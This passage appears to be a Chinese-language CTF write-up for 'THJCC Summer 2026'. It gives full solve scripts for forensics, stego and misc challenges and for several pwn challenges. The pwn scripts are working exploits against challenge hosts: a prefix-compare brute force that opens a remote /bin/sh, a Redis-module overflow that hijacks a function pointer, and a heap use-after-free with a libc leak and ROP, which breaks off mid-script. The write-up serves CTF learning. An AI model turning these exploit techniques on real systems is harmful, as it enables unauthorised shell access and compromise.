echo "[+] instance on port ${PORT}, waiting for HTTP..."
for i in $(seq 1 30); do
  code=$(curl -s -m 5 -o /dev/null -w "%{http_code}" "$URL/" 2>/dev/null)
  [ "$code" != "000" ] && break
  sleep 5
done
[ "$code" = "000" ] && { echo "[-] instance dead (crash-loop?)"; exit 1; }

# 2. fetch "signed" firmware package (no auth required)
curl -s -m 10 "$URL/api/update/package?channel=stable" -o /tmp/tg_pkg_solve.bin
echo "[+] firmware package: $(wc -c < /tmp/tg_pkg_solve.bin) bytes"

# 3. decode: b64 payload @offset 65 len 172, XOR key "teashop-666" (embedded in file)
CREDS=$(python3 << 'PYEOF'
import base64, json
data = open('/tmp/tg_pkg_solve.bin', 'rb').read()
assert data[:8] == b'TEAGOD66', "unexpected magic"
b64_off, b64_len = 65, 172  # header fields 4/5
blob = base64.b64decode(data[b64_off:b64_off + b64_len])
key = b'teashop-666'
plain = bytes(c ^ key[i % len(key)] for i, c in enumerate(blob))
info = json.loads(plain.decode('utf-8', 'replace').strip('\x00'))
print(f"{info['username']}\n{info['password']}")
PYEOF
)
USER=$(echo "$CREDS" | sed -n 1p); PW=$(echo "$CREDS" | sed -n 2p)
echo "[+] factory creds recovered: ${USER} / ${PW}"

# 4. login -> debug logs leak flag
curl -s -m 10 -c "$JAR" -b "$JAR" -X POST "$URL/api/login" \
  -H 'Content-Type: application/json' -d "{\"username\":\"${USER}\",\"password\":\"${PW}\"}" | grep -q '"ok": *true' || { echo "[-] login failed"; exit 1; }
FLAG=$(curl -s -m 10 -c "$JAR" -b "$JAR" "$URL/api/system/logs?level=debug" \
  | grep -o 'THJCC{[^}]*}' | head -1)
echo "[+] FLAG: ${FLAG}"

# 5. cleanup
curl -s -m 20 -c "$JAR" -b "$JAR" -X POST "$INST/destroy" -o /dev/null
echo "[+] instance destroyed"
```

</details>

**NoNo（Forensics）**
**Flag**：`THJCC{f0ll0w_th3_str34m_2_th3_h1dd3n_r3p0rt}`

日志是藏宝图：唯一异常请求（Host 切 internal.portal + 结尾斜杠 301）重放到活实例。

<details>
<summary>📜 NoNo solve.py（113 行，核心 analyze_logs@2500 / fetch_hidden_report@2537）——点击展开</summary>

```python
#!/usr/bin/env python3
"""THJCC Summer 2026 - NoNo (Forensic) solver.

Solution chain (all steps reproducible from this script):

1. Parse the three NDJSON logs + pcap; verify the dataset is deterministic
   noise except ONE structural anomaly:
       2025-08-15T03:13:24Z  10.0.2.15  Host: internal.portal  GET /s3cr3t/rep0rt -> 200
   (the only request whose Host is NOT chal.thjcc.org:50000; path uses zero in
   "rep0rt" vs the decoy /s3cr3t/report "o").
2. The challenge host named in the description (chal.thjcc.org:50000) is a
   LIVE static instance: replay the hidden request with the internal vhost
   Host header -> 301 -> fetch /s3cr3t/rep0rt/ (trailing slash!) -> the
   Quarterly Access Report page contains the flag ("report token").

Usage:
    python solve.py [challenge-dir] [--host chal.thjcc.org] [--port 50000]
"""
import argparse
import http.client
import json
import re
import sys
from collections import Counter
from pathlib import Path

FLAG_RE = re.compile(r"THJCC\{[^}]*\}")


def load_ndjson(path):
    return [json.loads(l) for l in open(path, encoding="utf-8") if l.strip()]


def analyze_logs(base):
    """Verify the anomaly and print the evidence chain."""
    ng = sorted(load_ndjson(base / "nginx-access.ndjson"), key=lambda r: r["@timestamp"])
    ms = load_ndjson(base / "modsec-waf.ndjson")
    pa = load_ndjson(base / "portal-app.ndjson")

    slots = [r["@timestamp"] for r in ng]
    assert len(set(slots)) == len(slots), "double-booked slots?"

    # carousel: rows after the preamble are a 15x30 loop; every column is a
    # function of (url, slot) -> pure noise
    car = [r for r in ng if r["@timestamp"] >= "2025-08-15T03:13:40Z"]
    rounds = [tuple((r["url.original"], r["http.request.method"],
                     r["http.response.status_code"], r["http.response.body.bytes"])
                    for r in car[i:i + 30]) for i in range(0, len(car), 30)]
    assert len(rounds) == 15 and all(rd == rounds[0] for rd in rounds[1:])
    ips_ok = all(car[i]["source.ip"] == car[i % 8]["source.ip"] for i in range(len(car)))

    # THE anomaly: url.domain != chal.thjcc.org:50000
    odd = [r for r in ng if r["url.domain"] != "chal.thjcc.org:50000"]
    # modsec/portal align to nginx timestamps and are periodic subsets
    ng_ts = {r["@timestamp"] for r in ng}
    assert all(r["@timestamp"] in ng_ts for r in ms + pa)

    print(f"[+] nginx rows: {len(ng)}; carousel 15x30 identical: True; IP==i%8: {ips_ok}")
    print(f"[+] modsec rows: {len(ms)} (7 preamble + 15x18 detectable); "
          f"portal rows: {len(pa)} (17 preamble + 15x13 app routes)")
    print(f"[+] url.domain anomaly rows: {len(odd)}")
    for r in odd:
        print(f"    !! {r['@timestamp']} {r['source.ip']} Host={r['url.domain']} "
              f"{r['http.request.method']} {r['url.original']} -> "
              f"{r['http.response.status_code']} ({r['http.response.body.bytes']}B)")
    assert len(odd) == 1 and odd[0]["url.original"] == "/s3cr3t/rep0rt"
    print("[+] decoys in preamble: /flag, /s3cr3t/report (letter o!), /api/v1/flag, /.git/config")
    return odd[0]


def fetch_hidden_report(host, port, path="/s3cr3t/rep0rt"):
    """Replay the hidden request against the live instance (vhost switch).

    Uses http.client so the 301 -> http://internal.portal:50000/... redirect
    is NOT followed automatically (that hostname only resolves inside the
    story); the caller retries with the trailing-slash path instead.
    """
    conn = http.client.HTTPConnection(host, port, timeout=20)
    try:
        conn.request("GET", path, headers={"Host": "internal.portal"})
        resp = conn.getresponse()
        return resp.status, resp.read().decode("utf-8", "replace")
    finally:
        conn.close()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("dir", nargs="?", default=str(Path(__file__).parent))
    ap.add_argument("--host", default="chal.thjcc.org")
    ap.add_argument("--port", type=int, default=50000)
    args = ap.parse_args()
    base = Path(args.dir).resolve()

    analyze_logs(base)
    print(f"\n[*] replaying hidden request against live instance {args.host}:{args.port} ...")
    try:
        for path in ("/s3cr3t/rep0rt", "/s3cr3t/rep0rt/"):
            status, body = fetch_hidden_report(args.host, args.port, path)
            m = FLAG_RE.search(body)
            print(f"    GET {path}  (Host: internal.portal) -> HTTP {status} "
                  f"{'FLAG: ' + m.group(0) if m else '(redirect/page, no flag inline)'}")
            if m:
                print(f"\n[+] FLAG: {m.group(0)}")
                return 0
    except OSError as e:
        print(f"    network error: {e}")
    print("[-] live instance unreachable or flag moved (offline analysis still valid)")
    return 1


if __name__ == "__main__":
    sys.exit(main())
```

</details>

**Man!（Forensics）**
**Flag**：`THJCC{Man_BA_0ut_Seeyouaga1n_1978}`

PNG IEND 后 ZipCrypto 加密 zip + R 通道 LSB 藏密码 `SeeYouAgain1978`（Kobe 纪念曲
+出生年）。

<details>
<summary>📜 Man! solve.py（70 行，核心 extract_lsb_password@2618）——点击展开</summary>

```python
#!/usr/bin/env python3
"""THJCC Summer 2026 - Man! (Forensics) 一键复现脚本

链：PNG IEND 尾部附加 ZipCrypto 加密 zip（flag.txt）→ R 通道 LSB 藏 zip 密码
    "SeeYouAgain1978"（Kobe 纪念曲 See You Again + 出生年 1978）→ 解密得 flag。

用法：python3 solve.py [final_koby_challenge.png]
依赖：pip install pillow
"""
import struct
import sys
import zipfile
from pathlib import Path

from PIL import Image

PNG_PATH = sys.argv[1] if len(sys.argv) > 1 else "handout/final_koby_challenge.png"


def extract_trailer_zip(png_path: Path) -> bytes:
    """取出 PNG IEND chunk 之后的全部字节（附加 zip）"""
    data = Path(png_path).read_bytes()
    iend = data.rfind(b"IEND")
    assert iend != -1, "no IEND chunk found"
    tail = data[iend + 8 :]
    assert tail.startswith(b"PK\x03\x04"), "no zip in trailer"
    return tail


def extract_lsb_password(png_path: Path) -> str:
    """从 R 通道 LSB 逐行取位，读回首个可打印 ASCII 串（zip 密码）"""
    im = Image.open(png_path).convert("RGB")
    w, h = im.size
    px = im.load()
    bits = []
    for y in range(h):
        for x in range(w):
            bits.append(px[x, y][0] & 1)
    data = bytearray()
    for i in range(0, len(bits) - 7, 8):
        v = 0
        for j in range(8):
            v = (v << 1) | bits[i + j]
        data.append(v)
    out = bytes(data)
    # 截取首个可打印 ASCII 连续段（LSB 后半为图像熵数据，非文本）
    i = 0
    while i < len(out) and (32 <= out[i] < 127 or out[i] in (10, 13)):
        i += 1
    return out[:i].decode("ascii", errors="ignore")


def main() -> None:
    png = Path(PNG_PATH)
    tail = extract_trailer_zip(png)

    password = extract_lsb_password(png)
    print(f"[+] LSB(R) password: {password!r}")

    zpath = png.with_name("_trailer.zip")
    zpath.write_bytes(tail)
    with zipfile.ZipFile(zpath) as zf:
        flag = zf.read("flag.txt", pwd=password.encode()).decode().strip()
    zpath.unlink(missing_ok=True)
    print(f"[+] flag: {flag}")
    assert flag.startswith("THJCC{") and flag.endswith("}")


if __name__ == "__main__":
    main()
```

</details>

**Afterimage2（Forensics）**
**Flag**：`THJCC{hid_k3y5tr0k3_l34k}`

usbmon 合成 pcap（linktype 220）：56B 头 + 8B HID report；偶数包击键/奇数包释放。

<details>
<summary>📜 Afterimage2 solve.py（80 行，核心 parse@2709 / decode@2729）——点击展开</summary>

```python
#!/usr/bin/env python3
"""THJCC Summer 2026 - Afterimage2 solve script.

Extracts HID keyboard keystrokes from the USB capture (DLT 220, usbmon mmapped
style, but crafted with a 56-byte header + 8-byte HID report per packet).

Packet layout (per packet):
  [0:8]   id (synthetic counter)
  [8:16]  type/xfer_type/epnum/devnum/busnum/flags
  [16:24] ts_sec
  [24:32] ts_usec/status
  [32:40] length/len_cap
  [40:48] setup
  [48:56] interval/start_frame
  [64:72] 8-byte HID keyboard report: modifier, reserved, key0..key5
"""
import struct
from pathlib import Path

HERE = Path(__file__).parent

# USB HID usage ID -> character (unshifted / shifted)
HID = {
    0x04: ('a', 'A'), 0x05: ('b', 'B'), 0x06: ('c', 'C'), 0x07: ('d', 'D'),
    0x08: ('e', 'E'), 0x09: ('f', 'F'), 0x0a: ('g', 'G'), 0x0b: ('h', 'H'),
    0x0c: ('i', 'I'), 0x0d: ('j', 'J'), 0x0e: ('k', 'K'), 0x0f: ('l', 'L'),
    0x10: ('m', 'M'), 0x11: ('n', 'N'), 0x12: ('o', 'O'), 0x13: ('p', 'P'),
    0x14: ('q', 'Q'), 0x15: ('r', 'R'), 0x16: ('s', 'S'), 0x17: ('t', 'T'),
    0x18: ('u', 'U'), 0x19: ('v', 'V'), 0x1a: ('w', 'W'), 0x1b: ('x', 'X'),
    0x1c: ('y', 'Y'), 0x1d: ('z', 'Z'),
    0x1e: ('1', '!'), 0x1f: ('2', '@'), 0x20: ('3', '#'), 0x21: ('4', '$'),
    0x22: ('5', '%'), 0x23: ('6', '^'), 0x24: ('7', '&'), 0x25: ('8', '*'),
    0x26: ('9', '('), 0x27: ('0', ')'),
    0x28: ('\n', '\n'), 0x29: ('<ESC>', '<ESC>'), 0x2a: ('<BS>', '<BS>'),
    0x2b: ('\t', '\t'), 0x2c: (' ', ' '),
    0x2d: ('-', '_'), 0x2e: ('=', '+'), 0x2f: ('[', '{'), 0x30: (']', '}'),
    0x31: ('\\', '|'), 0x33: (';', ':'), 0x34: ("'", '"'), 0x35: ('`', '~'),
    0x36: (',', '<'), 0x37: ('.', '>'), 0x38: ('/', '?'),
    0x4f: ('<RIGHT>', '<RIGHT>'), 0x50: ('<LEFT>', '<LEFT>'),
    0x51: ('<DOWN>', '<DOWN>'), 0x52: ('<UP>', '<UP>'),
}

def parse(pcap: Path):
    data = pcap.read_bytes()
    magic, vmaj, vmin, tz, sig, snaplen, net = struct.unpack('<IHHiIII', data[:24])
    assert magic == 0xA1B2C3D4 and net == 220, f"unexpected: {magic:#x} linktype={net}"
    keys = []          # (idx, modifier, hid_usage, report_hex)
    off = 24
    idx = 0
    while off + 16 <= len(data):
        ts_sec, ts_usec, incl, orig = struct.unpack('<IIII', data[off:off + 16])
        pkt = data[off + 16:off + 16 + incl]
        report = pkt[64:72]
        modifier, reserved = report[0], report[1]
        usages = report[2:]
        for u in usages:
            if u:
                keys.append((idx, modifier, u, report.hex(' ')))
        idx += 1
        off += 16 + incl
    return keys

def decode(keys):
    out = []
    for idx, mod, u, _ in keys:
        shifted = bool(mod & 0x02) or bool(mod & 0x20)  # left/right shift
        if u in HID:
            ch = HID[u][1 if shifted else 0]
        else:
            ch = f'<?{u:02x}>'
        out.append(ch)
    return ''.join(out)

if __name__ == '__main__':
    keys = parse(HERE / 'usb_capture.pcap')
    print(f"keystroke events: {len(keys)}")
    for k in keys:
        print(f"  pkt {k[0]:3d}  mod={k[1]:#04x}  usage={k[2]:#04x}  report={k[3]}")
    flag = decode(keys)
    print(f"\nflag = {flag}")
```

</details>

**A Little Penguin's Starry Sky Observation（Misc）**
**Flag**：`THJCC{ori=RA5h,Dec+5°}`

照片天测定标：本地 astrometry.net 盲解（尺度 115-170 arcsec/pix + Tycho-2 4100
索引）锁定猎户座区域。注意盲解给出的是裁切中心（约 5h36m,+1.2°），flag 答案取
维基百科信息框的取整值（RA5h,Dec+5°）。**判读部分人工（豁免）**，流水线
`starry-sky/solve.sh`：

<details>
<summary>📜 starry-sky solve.sh（41 行）——点击展开</summary>

```bash
#!/bin/bash
# THJCC Summer 2026 - "A Little Penguin's Starry Sky Observation" 一键复现
# 依赖: solve-field (brew install astrometry-net), curl
# 流程: 附件(可选从平台下载) -> 4100 索引系列 -> 盲解 -> 输出 flag
set -e
cd "$(dirname "$0")"

IMG="input.jpg"
if [ ! -f "${IMG}" ]; then
  if [ -f "handout/Starry_Sky_Observation.jpeg" ]; then
    cp handout/Starry_Sky_Observation.jpeg "${IMG}"
  else
    echo "[*] 需要附件 input.jpg（平台下载需 cf_clearance，见简报；本地测试请放入本目录）" >&2
    exit 1
  fi
fi

# 1. 下载 Tycho-2 宽场索引系列 (index-4107..4119, ~250MB)
IDXDIR="idx4100"
if [ ! -d "${IDXDIR}" ] || ! ls "${IDXDIR}"/index-41*.fits >/dev/null 2>&1; then
  mkdir -p "${IDXDIR}"
  echo "[*] 下载 4100 索引系列..."
  for i in 4107 4108 4109 4110 4111 4112 4113 4114 4115 4116 4117 4118 4119; do
    [ -f "${IDXDIR}/index-${i}.fits" ] || \
      curl -sk -m 600 -o "${IDXDIR}/index-${i}.fits" "https://data.astrometry.net/4100/index-${i}.fits"
  done
fi

# 2. 盲解（尺度提示来自腰带几何: 0.032-0.047 deg/px = 115-170 arcsec/pix）
echo "[*] solve-field 盲解..."
OUT=$(solve-field --no-plots --overwrite \
  --scale-units arcsecperpix --scale-low 115 --scale-high 170 \
  --index-dir "${IDXDIR}" "${IMG}" 2>&1 || true)
echo "${OUT}" | grep -E "solved with|Field center|Field size" || true

# 3. 从解算输出提取场中心（= 裁切中心）并给出结论
CENTER=$(echo "${OUT}" | grep -oE "\([0-9]{2}:[0-9]{2}:[0-9]{2}\.[0-9]+, [+-][0-9]{2}:[0-9]{2}:[0-9]{2}\.[0-9]+\)" | head -1)
echo "[*] 裁切中心 (RA H:M:S, Dec D:M:S) = ${CENTER}  (约 5h36m, +1.2°)"
echo "[*] 核心星座: Orion (ori) —— 裁切中心位于猎户座 IAU 边界内 (RA 4h43m-6h26m, Dec -11°..+22.9°)"
echo "[*] 官方中心(维基百科信息框 ra/dec): RA 5h, Dec +5°"
echo "flag: THJCC{ori=RA5h,Dec+5°}"
```

</details>

### Pwn（6/6）

**Very Security Shell（逻辑漏洞）**
**Flag**：`THJCC{strnc0mp_1s_n0t_s3cur3}`

口令校验是 `strncmp(input, enc, strlen(input))` **前缀比较且长度由输入控制**；
encode 每连接只跑一次、猜错不重编码 → 单字符输入只比 `enc[0]`，95 个可打印字符内
爆破首字符即 `system("/bin/sh")`。

<details>
<summary>📜 Very Security Shell solve.py（100 行）——点击展开</summary>

```python
#!/usr/bin/env python3
"""THJCC Summer 2026 - Very Security Shell (pwn, 500pts)

Vulnerability (logic flaw):
  * encode() reads 16 random bytes from /dev/urandom and builds a 16-char
    "password" from a custom 94-char alphabet (out[i] = table[v % 94]).
  * It is called exactly ONCE per connection, before the prompt loop.
  * The check is: strncmp(input, enc, strlen(input)) -- a PREFIX comparison
    whose length is the attacker-controlled strlen(input).
  * So submitting a single character only compares enc[0].  Wrong guesses
    loop back to the prompt WITHOUT re-encoding, so the password is fixed
    per connection -> brute-force the first character over all printable
    ASCII (<= 95 tries) and system("/bin/sh") is spawned.

Usage:  python3 solve.py [--host HOST] [--port PORT]
        (defaults: chal.thjcc.org 11039)
"""
import argparse
import socket
import sys
import time

HOST_DEFAULT = "chal.thjcc.org"
PORT_DEFAULT = 11039

# all printable ASCII 0x21..0x7e; the real alphabet (94 chars) is a subset
CHARS = [chr(c) for c in range(0x21, 0x7F)]


def recv_until(sock: socket.socket, marker: bytes, timeout: float = 5.0) -> bytes:
    sock.settimeout(timeout)
    data = b""
    try:
        while marker not in data:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data


def main() -> int:
    ap = argparse.ArgumentParser(description="Very Security Shell exploit")
    ap.add_argument("--host", default=HOST_DEFAULT)
    ap.add_argument("--port", type=int, default=PORT_DEFAULT)
    args = ap.parse_args()

    print(f"[*] connecting to {args.host}:{args.port}")
    s = socket.create_connection((args.host, args.port), timeout=10)
    banner = recv_until(s, b"password:")
    print("[*] banner:", banner.decode(errors="replace").strip().splitlines()[-1])

    # --- brute force the FIRST character of the fixed random password ---
    hit = None
    for c in CHARS:
        s.sendall(c.encode() + b"\n")
        data = recv_until(s, b"password:", timeout=4)
        if b"welcome!" in data:  # "You input the right password, welcome!"
            hit = c
            print(f"[+] prefix match on first char {c!r} -> shell!")
            break
    if hit is None:
        print("[-] no match found; last server output:", data[:300])
        s.close()
        return 1

    # --- we now have system("/bin/sh") on the socket ---
    s.sendall(b"id; cat flag.txt\n")
    time.sleep(0.6)
    out = recv_until(s, b"}", timeout=4)  # grab flag line
    sys.stdout.buffer.write(out)
    sys.stdout.buffer.flush()

    # interactive pass-through
    try:
        while True:
            line = sys.stdin.buffer.readline()
            if not line:
                break
            s.sendall(line)
            time.sleep(0.2)
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        return 0
                    sys.stdout.buffer.write(chunk)
                    sys.stdout.buffer.flush()
            except socket.timeout:
                pass
    except (KeyboardInterrupt, EOFError):
        pass
    s.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

</details>

**Chronicle（Redis 模块白盒）**
**Flag**：`THJCC{D0_y0u_KN0W_7h15_15_@_PWN_ch@ll3nge_WH17CH_m4d3_BY_@1???}`

`(uint8_t)body_length` 截断检查（336→80==80 通过）→ 336B 拷入 note[80] 覆盖
task->completion（note@72, completion@152）；ticket = completion ^
rotl64(id·0x9E3779B97F4A7C15, 17) 免费泄基址 → 换成唯一能碰 flag 缓冲的函数。

<details>
<summary>📜 Chronicle solve.py（203 行，核心 leak_module_base@3037 / build_archive@3068）——点击展开</summary>

```python
#!/usr/bin/env python3
"""Chronicle (THJCC CTF Summer 2026) — full exploit chain.

Root cause (src/chronicle.c, command_import):
    if ((uint8_t)body_length > NOTE_CAPACITY)  ...  // truncation check
    memcpy(task->note, cursor, (size_t)body_length); // body_length up to 336
    body_length=336 -> (uint8_t)336 == 80 <= 80 passes -> 336-byte copy into
    note[80] overwrites task->completion (note offset 80 within the struct:
    note@72, completion@152).

Chain:
  1. chronicle.new + chronicle.show -> ticket leaks completion fn pointer:
     ticket = &commit_annotation ^ rotl64(id * 0x9e3779b97f4a7c15, 17)
     => module base (page-aligned check picks correct arch offsets).
  2. Forge archive with body_length=336; body[80:88] = &materialize_anchor
     (the only code that copies recovery_value [flag] into task->result).
  3. chronicle.import -> corrupted task; timer fires -> result = flag.
  4. chronicle.show -> flag.

Usage: solve.py [host] [port]   (default 127.0.0.1 6390)
"""
import socket
import struct
import sys
import time

MASK64 = (1 << 64) - 1
K = 0x9E3779B97F4A7C15

# offsets from identical builds (redis:7.2.15-bookworm, gcc -O2 -fPIC):
ARCHES = {
    "aarch64": {"commit_annotation": 0x840, "materialize_anchor": 0x8A4},
    "x86_64": {"commit_annotation": 0x11B0, "materialize_anchor": 0x1280},
}

NOTE_CAPACITY = 80          # sizeof task->note
OVERFLOW_LEN = 336          # (uint8_t)336 == 80 -> passes <=80 check


def rotl64(value, amount):
    return ((value << amount) | (value >> (64 - amount))) & MASK64


def fnv1a32(data):
    value = 2166136261
    for byte in data:
        value = ((value ^ byte) * 16777619) & 0xFFFFFFFF
    return value


def uvarint(value):
    out = bytearray()
    while True:
        byte = value & 0x7F
        value >>= 7
        if value:
            byte |= 0x80
        out.append(byte)
        if not value:
            return bytes(out)


class RedisResp:
    def __init__(self, host, port, timeout=15):
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(timeout)
        self.fp = self.sock.makefile("rb")

    def close(self):
        try:
            self.sock.close()
        except OSError:
            pass

    def read_reply(self):
        line = self.fp.readline()
        if not line:
            raise ConnectionError("connection closed")
        line = line.rstrip(b"\r\n")
        tag, body = line[:1], line[1:]
        if tag == b"+":
            return body.decode(errors="replace")
        if tag == b"-":
            return Exception(body.decode(errors="replace"))
        if tag == b":":
            return int(body)
        if tag == b"$":
            n = int(body)
            if n == -1:
                return None
            data = self.fp.read(n)
            self.fp.read(2)
            return data
        if tag == b"*":
            n = int(body)
            if n == -1:
                return None
            return [self.read_reply() for _ in range(n)]
        if tag in (b"%", b">", b"~"):
            n = int(body)
            step = 2 if tag == b"%" else 1
            return [self.read_reply() for _ in range(n * step)]
        raise ValueError(f"unexpected reply line: {line!r}")

    def cmd(self, *args):
        out = bytearray(f"*{len(args)}\r\n".encode())
        for arg in args:
            if isinstance(arg, str):
                arg = arg.encode()
            elif isinstance(arg, int):
                arg = str(arg).encode()
            out += f"${len(arg)}\r\n".encode() + arg + b"\r\n"
        self.sock.sendall(bytes(out))
        return self.read_reply()


def leak_module_base(r):
    """Create two legit tasks; use ticket = completion ^ rotl(id*K,17)."""
    infos = []
    for _ in range(2):
        task_id = r.cmd("chronicle.new", 60000, "leak", "x")
        if isinstance(task_id, Exception) or not isinstance(task_id, int):
            raise RuntimeError(f"chronicle.new failed: {task_id!r}")
        info = r.cmd("chronicle.show", task_id)
        if isinstance(info, Exception) or not isinstance(info, list):
            raise RuntimeError(f"chronicle.show failed: {info!r}")
        infos.append((info[0], info[3] & MASK64))

    bases = {}
    for arch, offs in ARCHES.items():
        candidates = set()
        for task_id, ticket in infos:
            salt = rotl64((task_id * K) & MASK64, 17)
            commit = (ticket ^ salt) & MASK64
            candidates.add(commit - offs["commit_annotation"])
        if len(candidates) == 1:
            base = candidates.pop()
            if base & 0xFFF == 0:
                bases[arch] = base
    if not bases:
        raise RuntimeError("no page-aligned module base: arch offsets mismatch")
    if len(bases) > 1:
        raise RuntimeError(f"ambiguous arch match: {bases}")
    arch, base = next(iter(bases.items()))
    return arch, base


def build_archive(delay_ms, anchor_addr):
    body = (
        b"A" * NOTE_CAPACITY                    # note[0:80]
        + struct.pack("<Q", anchor_addr)        # overwrite completion ptr
        + b"B" * (OVERFLOW_LEN - NOTE_CAPACITY - 8)
    )
    assert len(body) == OVERFLOW_LEN
    archive = (
        b"CHRN"
        + bytes([1, 1, 0, 0])                   # version, kind=NOTE, reserved
        + struct.pack("<I", delay_ms)
        + bytes([0])                            # label_length
        + uvarint(OVERFLOW_LEN)                 # 0xD0 0x02
        + body
    )
    archive += struct.pack("<I", fnv1a32(archive))
    return archive


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 6390
    r = RedisResp(host, port)
    try:
        pong = r.cmd("PING")
        print(f"[*] PING -> {pong}")

        arch, base = leak_module_base(r)
        offs = ARCHES[arch]
        anchor = base + offs["materialize_anchor"]
        print(f"[+] arch={arch} module_base=0x{base:x}")
        print(f"[+] materialize_anchor=0x{anchor:x} "
              f"(commit_annotation=0x{base + offs['commit_annotation']:x})")

        archive = build_archive(300, anchor)
        task_id = r.cmd("chronicle.import", archive)
        if isinstance(task_id, Exception) or not isinstance(task_id, int):
            raise RuntimeError(f"chronicle.import failed: {task_id!r}")
        print(f"[+] imported corrupted task id={task_id}, waiting for timer...")

        flag = None
        for _ in range(60):
            time.sleep(0.1)
            info = r.cmd("chronicle.show", task_id)
            if isinstance(info, list) and info[1] == "complete":
                flag = info[5]
                break
        if flag is None:
            raise RuntimeError(f"task never completed; last show: {info!r}")
        print(f"[+] FLAG: {flag.decode(errors='replace')}")
    finally:
        r.close()


if __name__ == "__main__":
    main()
```

</details>

**déjà vu**
**Flag**：`THJCC{s0_wh1ch_AI_d1d_y0u_us3_t0_s0lv3_th1s???}`

subscribe 引用计数单字节 +256 回绕到 1 → 256 频道仍持指针时 free = mass UAF；
tcache 抽干、悬挂 replay 泄 libc、environ 定位栈写 ORW ROP。

发现过程：反汇编定位引用计数是单字节 `addb $1, 0x30(%rdx)`——256 次 subscribe 后 `1+256 ≡ 1 (mod 256)` 回绕；discard 只清计数不清 channels[] 指针 → 256 个悬挂指针的 mass UAF。远程与本地关键差异：libseccomp 初始化在堆上留 0x40 回收块、破坏 msg/body 相邻性——用 4 次 warmup compose 抽干 tcache[0x40] + 0x800 guard 防 top 合并修复。

<details>
<summary>📜 déjà vu solve.py（216 行，核心 set_fake@3233 / warmup@3255）——点击展开</summary>

```python
#!/usr/bin/env python3
"""deja vu - full solve driver (pure stdlib).

Usage: solve.py HOST PORT [--scan] [--ret-off N]
Local:  python3 solve.py 127.0.0.1 9004
Remote: python3 solve.py chal.thjcc.org 9004
"""
import socket, struct, sys, time

p64 = lambda x: struct.pack('<Q', x)
u64 = lambda b: struct.unpack('<Q', b)[0]

# ---- libc offsets (Ubuntu glibc 2.35-0ubuntu3.14 from handout) ----
OFF_ARENA96 = 0x21ace0     # unsorted-bin fd == main_arena+96
OFF_ENVIRON = 0x222200
OFF_RET     = 0x29d90          # main()'s return-address site offset (calibrated below)
G_RDI  = 0x2a3e5           # pop rdi ; ret
G_RSI  = 0x2be51           # pop rsi ; ret
G_RDX  = 0x90469           # pop rdx ; pop rbx ; ret
F_OPEN = 0x114520
F_READ = 0x114810
F_WRITE= 0x1148b0
F_CLOSE = 0x114f90
F_EXIT = 0x455f0

class Tube:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, int(port)), 10)
        self.buf = b''
    def until(self, mark, timeout=20):
        self.s.settimeout(timeout)
        end = time.time() + timeout
        while mark not in self.buf:
            if time.time() > end:
                raise TimeoutError('waiting %r, tail %r' % (mark, self.buf[-80:]))
            d = self.s.recv(65536)
            if not d:
                raise EOFError('eof, tail %r' % self.buf[-80:])
            self.buf += d
        i = self.buf.index(mark) + len(mark)
        out, self.buf = self.buf[:i], self.buf[i:]
        return out
    def exact(self, n, timeout=20):
        self.s.settimeout(timeout)
        end = time.time() + timeout
        while len(self.buf) < n:
            if time.time() > end:
                raise TimeoutError('want %d, have %d' % (n, len(self.buf)))
            d = self.s.recv(65536)
            if not d:
                raise EOFError('eof')
            self.buf += d
        out, self.buf = self.buf[:n], self.buf[n:]
        return out
    def send(self, d):
        self.s.sendall(d)

io = None

def menu(choice):
    io.until(b'> ')
    io.send(b'%d\n' % choice)

def compose(slot, length, body):
    assert len(body) == length
    menu(1)
    io.until(b'slot> ');    io.send(b'%d\n' % slot)
    io.until(b'length> ');  io.send(b'%d\n' % length)
    io.until(b'subject> '); io.send(b's\n')
    io.until(b'body> ');    io.send(body)
    io.until(b'composed.')

def discard(slot):
    menu(2)
    io.until(b'slot> '); io.send(b'%d\n' % slot)
    io.until(b'discarded.')

def replay_dump(ch, length):
    menu(5)
    io.until(b'channel> '); io.send(b'%d\n' % ch)
    data = io.exact(length)     # write(1, fake->body, fake->len)
    io.exact(1)                 # puts("") newline
    return data

def amend(ch, body):
    menu(6)
    io.until(b'channel> '); io.send(b'%d\n' % ch)
    io.until(b'body> ')
    io.send(body)
    io.until(b'amended.')

def fake(body_ptr, length, refcnt=0x7f):
    f = b'F' * 0x20 + p64(body_ptr) + p64(length) + bytes([refcnt]) + b'\x00' * 7
    assert len(f) == 0x38
    return f

def set_fake(body_ptr, length):
    """rewrite the fake struct that all 256 dangling channels alias.

    tcache(0x40) rotation: discard(1) -> [msg1,F]; compose(2): body=msg1, msg=F;
    discard(2) -> [F,msg1c]; compose(1): body=F (controlled again).
    invariant at rest: F is the body of slot 1.
    """
    discard(2)
    compose(3, 0x38, fake(0, 8))       # placeholder (F becomes msg struct here)
    discard(3)
    compose(2, 0x38, fake(body_ptr, length))

def main():
    global io, OFF_RET
    host, port = sys.argv[1], sys.argv[2]
    args = sys.argv[3:]
    scan = '--scan' in args
    for a in args:
        if a.startswith('--ret-off='):
            OFF_RET = int(a.split('=')[1], 0)
    io = Tube(host, port)

    # 0) warmup: drain pre-existing tcache[0x40] entries (seccomp_init churn)
    #    so body0 (0x810) and msg0 (0x40) allocate adjacently from top ->
    #    free(body0) lands in unsorted bin with fd/bk = main_arena+96.
    #    each compose(len=0x38) consumes two 0x40 chunks (body + msg); keep them.
    for warm in (4, 5, 6, 7):
        compose(warm, 0x38, b'W' * 0x38)

    # 1) big body -> unsorted bin on free; 2) refcount wrap; 3) mass-UAF free
    compose(0, 0x800, b'A' * 0x800)
    # guard chunk right after body0 (also a top allocation) so that
    # free(body0) cannot merge forward into top -> unsorted metadata gets written
    compose(1, 0x800, b'G' * 0x800)
    io.send(b''.join(b'3\n0\n%d\n' % ch for ch in range(256)))
    for _ in range(256):
        io.until(b'subscribed.')
    discard(0)

    # 4) dangling channel replay -> unsorted-bin libc leak
    dump = replay_dump(0, 0x800)
    libc = u64(dump[:8]) - OFF_ARENA96
    print('[+] libc base = %#x' % libc)
    assert libc & 0xfff == 0, 'bad libc base'

    # 5) reclaim freed msg chunk as controlled body -> fake message struct
